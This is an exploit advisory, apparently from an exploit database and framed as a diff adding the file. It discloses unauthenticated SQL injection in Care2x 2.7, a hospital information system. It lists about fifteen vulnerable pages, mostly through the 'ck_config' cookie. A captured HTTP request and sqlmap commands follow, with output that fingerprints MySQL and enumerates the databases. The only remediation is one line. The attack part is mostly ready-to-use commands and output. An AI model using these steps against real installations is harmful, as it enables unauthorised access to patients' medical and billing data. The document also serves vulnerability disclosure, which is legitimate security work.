@@ -1,0 +1,85 @@
+# Exploit Title: Care2x 2.7  (HIS) Hospital Information system - Multiples SQL Injection
+# Date: 01/17/2019
+# Software Links/Project: https://github.com/care2x/care2x | http://www.care2x.org/
+# Version: Care2x 2.7
+# Exploit Author: Carlos Avila
+# Category: webapps
+# Tested on: Windows 8.1 / Ubuntu Linux
+# Contact: http://twitter.com/badboy_nt
+
+1. Description
+  
+Care2x is PHP based Hospital Information system, It features complete clinical flow management, laboratory management, patient records, multi-user support with permissions, stock management and accounting and billing management, PACS integration and DICOM viewer. Care2x provides some other features as CCTV integration which has not been seen in other open source HIS.
+
+This allows unauthenticated remote attacker to execute arbitrary SQL commands and obtain private information. Admin or users valid credentials aren't required. In a deeper analysis other pages are also affected with the vulnerability over the same input.
+
+It written in PHP version 5.x, it is vulnerable to SQL Injection. The parameter on cookie 'ck_config' is vulnerable on multiples URLS occurrences, explains to continue:
+
+http://192.168.0.108/main/login.php [parameter affected: ck_config cookie] (without authentication)
+
+
+	/main/indexframe.php [parameter affected: ck_config cookie]
+	/main/op-doku.php [parameter affected: ck_config cookie]
+	/main/spediens.php [parameter affected: ck_config cookie]
+	/modules/ambulatory/ambulatory.php [parameter affected: ck_config cookie]
+	/modules/fotolab/fotolab_pass.php [parameter affected: ck_config cookie]
+	/modules/laboratory/labor.php [parameter affected: ck_config cookie]
+	/modules/med_depot/medlager.php [parameter affected: ck_config cookie]
+	/modules/news/headline-read.php [parameter affected: nr parameter]
+	/modules/news/newscolumns.php [parameter affected: dept_nr parameter]
+	/modules/news/start_page.php [parameter affected: sid cookie]
+	/modules/nursing/nursing-fastview.php [parameter affected: ck_config cookie]
+	/modules/nursing/nursing-fastview.php [parameter affected: currYear parameter]
+	/modules/nursing/nursing-patient-such-start.php [parameter affected: ck_config cookie]
+	/modules/nursing/nursing-schnellsicht.php [parameter affected: ck_config cookie]
+	/modules/registration_admission/patient_register_pass.php [parameter affected: ck_config cookie]
+
+
+2. Proof of Concept
+
+GET /main/login.php?ntid=false&lang=en HTTP/1.1
+Host: 192.168.0.108
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.108/main/indexframe.php?boot=1&mask=&lang=en&cookie=&sid=6fclqapl9gsjhrcgoh3q0la5sp
+Connection: close
+Cookie: sid=6fclqapl9gsjhrcgoh3q0la5sp; ck_sid6fclqapl9gsjhrcgoh3q0la5sp=m14AAA%3D%3D%23WVUYpUnF%2Fo28ZWY45A5Sh9HMvr%2FZ8wVabFY%3D; ck_config=CFG5c414492459f90.28518700%201547781266
+Upgrade-Insecure-Requests: 1
+
+
+root@kali19:~#sqlmap -r SQLI-CARE2X --dbms mysql -f -v 2 --level 3 -p ck_config
+
+
+[14:18:15] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[14:18:15] [INFO] testing MySQL
+[14:18:16] [INFO] confirming MySQL
+[14:18:19] [INFO] the back-end DBMS is MySQL
+[14:18:19] [INFO] actively fingerprinting MySQL
+[14:18:20] [INFO] executing MySQL comment injection fingerprint
+[14:18:33] [DEBUG] turning off reflection removal mechanism (for optimization purposes)
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: active fingerprint: MySQL >= 5.7
+               comment injection fingerprint: MySQL 5.7.24
+
+
+root@kali19:~#sqlmap -r SQLI-CARE2X --dbms mysql -v 2 --level 3 -p ck_config --dbs
+
+[20:09:33] [INFO] fetching database names
+[20:09:33] [INFO] the SQL query used returns 4 entries
+[20:09:33] [INFO] retrieved: information_schema
+[20:09:33] [INFO] retrieved: care2x
+[20:09:33] [DEBUG] performed 10 queries in 0.20 seconds
+available databases [2]:
+[*] care2x
+[*] information_schema
+[*] performance_schema
+[*] mysql
+
+
+
+3. Solution:
+
+Application inputs must be validated correctly in all developed classes.
